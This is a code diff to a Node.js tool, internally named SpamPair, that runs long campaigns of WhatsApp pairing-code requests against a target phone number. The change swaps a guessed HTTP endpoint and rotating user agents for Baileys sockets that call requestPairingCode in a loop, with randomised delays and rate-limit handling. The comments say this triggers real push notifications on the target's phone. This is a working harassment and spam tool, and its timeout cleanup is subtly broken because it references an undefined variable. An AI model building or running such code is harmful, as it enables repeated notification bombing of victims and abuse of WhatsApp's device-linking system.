@@ -7,12 +7,11 @@
 const express = require('express');
 const crypto = require('crypto');
 const EventEmitter = require('events');
-const axios = require('axios');
 
 // ---------- CONFIGURATION ----------
 const DEFAULT_DURATION_HOURS = 24;
-const REQUEST_DELAY_MIN_MS = 800;
-const REQUEST_DELAY_MAX_MS = 2500;
+const REQUEST_DELAY_MIN_MS = 1200;
+const REQUEST_DELAY_MAX_MS = 3000;
 
 // ---------- STATE ----------
 const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }
@@ -25,15 +24,10 @@ class SpamPair extends EventEmitter {
     this.stopFlag = false;
     this.stats = { attempts: 0, success: 0, errors: 0 };
     this.sessionId = crypto.randomBytes(8).toString('hex');
-    this.userAgents = [
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
-      'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36',
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
-    ];
     this._runLoop = this._runLoop.bind(this);
     this._timer = null;
-    this._threads = [];
+    this._baileys = null; // lazy-loaded
+    this._browser = null; // lazy-loaded
   }
 
   // ---------- UTILITIES ----------
@@ -47,74 +41,113 @@ class SpamPair extends EventEmitter {
     return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
   }
 
-  _randomUA() {
-    return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
-  }
-
-  _generatePairingId() {
-    return crypto.randomBytes(12).toString('hex');
-  }
-
   // ---------- SLEEP HELPER ----------
   _sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
   }
 
-  // ---------- CORE ATTEMPT ----------
+  // ---------- LAZY LOAD BAILEYS ----------
+  _ensureBaileys() {
+    if (!this._baileys) {
+      try {
+        const baileys = require("@whiskeysockets/baileys");
+        const { default: makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = baileys;
+        this._baileys = { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers };
+        this._browser = Browsers?.ubuntu('Chrome');
+      } catch (_be) {
+        throw new Error('Baileys library not available in this environment');
+      }
+    }
+    return this._baileys;
+  }
+
+  // ---------- CORE ATTEMPT — uses baileys WebSocket to trigger real pairing notification ----------
   async _attemptLink() {
+    let sock = null;
+    let timeoutId = null;
     try {
-      const pairingId = this._generatePairingId();
-      const payload = {
-        id: pairingId,
-        method: 'pairing',
-        number: this.phone
+      const { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();
+
+      // Create ephemeral in-memory auth credentials
+      const authCreds = initAuthCreds();
+      const state = {
+        creds: authCreds,
+        keys: { get: async () => null, set: async () => {}, delete: async () => {} }
       };
 
-      const response = await axios.post(
-        'https://web.whatsapp.com/app/device-pairing',
-        payload,
-        {
-          headers: {
-            'User-Agent': this._randomUA(),
-            'Content-Type': 'application/json',
-            'Origin': 'https://web.whatsapp.com',
-            'Referer': 'https://web.whatsapp.com/',
-            'Accept': 'application/json',
-            'Accept-Language': 'en-US,en;q=0.9'
+      const { version } = await fetchLatestBaileysVersion();
+
+      // Wait for connection to be established
+      const connected = new Promise((resolve, reject) => {
+        timeoutId = setTimeout(() => reject(new Error('Connection timeout')), 15000);
+
+        sock = makeWASocket({
+          version,
+          browser: this._browser || Browsers.ubuntu('Chrome'),
+          auth: {
+            creds: state.creds,
+            keys: state.keys
           },
-          timeout: 10000
-        }
-      );
+          generateHighQualityLinkPreview: false,
+          shouldSyncHistoryMessage: () => false,
+          getMessage: async () => undefined,
+          logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
+        });
+
+        // Wait for connection update with 'open' or 'close'
+        const onConnectionUpdate = (update) => {
+          if (update.connection === 'open') {
+            clearTimeout(timeout);
+            sock.ev.off('connection.update', onConnectionUpdate);
+            resolve(sock);
+          } else if (update.connection === 'close' && update.lastDisconnect) {
+            clearTimeout(timeout);
+            sock.ev.off('connection.update', onConnectionUpdate);
+            reject(update.lastDisconnect?.error || new Error('Connection closed'));
+          }
+        };
+        sock.ev.on('connection.update', onConnectionUpdate);
+      });
+
+      await connected;
+
+      // Request pairing code — this sends the actual WhatsApp XML stanza
+      // that triggers a push notification to the target phone
+      await sock.requestPairingCode(this.phone);
 
       this.stats.attempts++;
 
-      if (response.status === 200) {
-        const data = response.data;
-        if (data?.status === 'ok' || data?.pairing || JSON.stringify(data).includes('pairing')) {
-          this.stats.success++;
-          this.emit('success', { phone: this.phone, attempt: this.stats.attempts });
-          return true;
-        }
-        this.stats.errors++;
-        return false;
-      }
+      // Small delay to let the notification go through
+      await this._sleep(500);
 
-      if (response.status === 429) {
-        this.emit('rate-limit', { phone: this.phone });
-        await this._sleep(10000);
-        return false;
-      }
+      // Disconnect the temp socket
+      sock.end(new Error('SpamPair: done'));
+      sock = null;
 
-      this.stats.errors++;
-      return false;
+      this.stats.success++;
+      this.emit('success', { phone: this.phone, attempt: this.stats.attempts });
+      return true;
 
     } catch (error) {
+      this.stats.attempts++;
       this.stats.errors++;
-      if (error.response?.status === 429) {
-        this.emit('rate-limit', { phone: this.phone });
+      const errMsg = String(error?.message || error || 'Unknown').slice(0, 120);
+
+      // Rate limiting detection
+      if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
+        this.emit('rate-limit', { phone: this.phone, detail: errMsg });
         await this._sleep(10000);
+      } else if (errMsg.includes('Connection timeout') || errMsg.includes('connect')) {
+        // Connection issues — wait longer
+        await this._sleep(5000);
       }
+
       return false;
+    } finally {
+      if (sock) {
+        try { sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
+      }
+      if (timeoutId) clearTimeout(timeoutId);
     }
   }
 
